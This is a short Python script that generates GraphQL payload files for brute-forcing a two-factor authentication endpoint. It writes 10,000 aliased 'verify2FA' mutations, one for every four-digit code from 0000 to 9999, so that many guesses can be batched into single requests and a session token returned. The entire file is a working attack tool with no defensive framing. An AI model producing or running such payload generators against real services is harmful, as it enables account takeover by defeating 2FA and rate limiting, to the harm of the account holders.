start = "0000"
alias = "aaaa"
chars = ["0","1","2","3","4","5","6","7","8","9"]
a_chars = ["a","b","c","d","e","f","g","h","i","j"]

code = list(start)
a_code = list(alias)
for i1 in range(len(chars)):
    code[0] = chars[i1]
    a_code[0] = a_chars[i1]
    f = open(str(i1) + "payload.graphql", "a")
    for i2 in range(len(chars)):
        code[1] = chars[i2]
        a_code[1] = a_chars[i2]
        for i3 in range(len(chars)):
            code[2] = chars[i3]
            a_code[2] = a_chars[i3]
            for i4 in range(len(chars)):
                code[3] = chars[i4]
                a_code[3] = a_chars[i4]
                string = "\t"+"".join(a_code)+":verify2FA(otp: \""+ "".join(code) +"\") {\n\t\tmessage, token\n\t}"
                f.write(string)
                print("wrote " + "".join(code))
    f.close()
